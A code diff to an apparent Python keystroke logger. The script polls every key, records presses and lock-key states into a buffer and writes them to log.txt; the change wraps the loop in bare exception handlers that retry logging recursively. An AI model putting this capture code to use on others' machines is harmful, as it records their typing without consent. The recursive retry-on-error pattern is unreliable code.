@@ -391,29 +391,35 @@ def init():
 
 
 def write_to_log():
-    with codecs.open("log.txt", "w", 'UTF-8') as f:
-        f.write(buf)
+    try:
+        f = open("log.txt", "w")
+        f.close()
+        with codecs.open("log.txt", "w", 'UTF-8') as f:
+            f.write(buf)
+    except:
+        write_to_log()
 
 
 def main():
     init()
     while True:
-        if ctrl_key_pressed() and 'c' in keysDown:
-            break
-        for k in all_keys:
-            key_is_pressed = is_key_pressed(all_keys[k])
-            if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
-                key_was_pressed(k)
-                keysPressed[k] = True
-                wasKeyPressedTheLastTimeWeChecked[k] = True
-                if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
-                    locks_state[k] = not locks_state[k]
-            if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
-                key_was_unpressed(k)
-                keysPressed[k] = False
-                wasKeyPressedTheLastTimeWeChecked[k] = False
+        try:
+            if ctrl_key_pressed() and 'c' in keysDown:
+                break
+            for k in all_keys:
+                key_is_pressed = is_key_pressed(all_keys[k])
+                if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
+                    key_was_pressed(k)
+                    keysPressed[k] = True
+                    wasKeyPressedTheLastTimeWeChecked[k] = True
+                    if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
+                        locks_state[k] = not locks_state[k]
+                if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
+                    key_was_unpressed(k)
+                    keysPressed[k] = False
+                    wasKeyPressedTheLastTimeWeChecked[k] = False
+        except:
+            write_to_log()
     write_to_log()
-    quit()
-
 
 main()
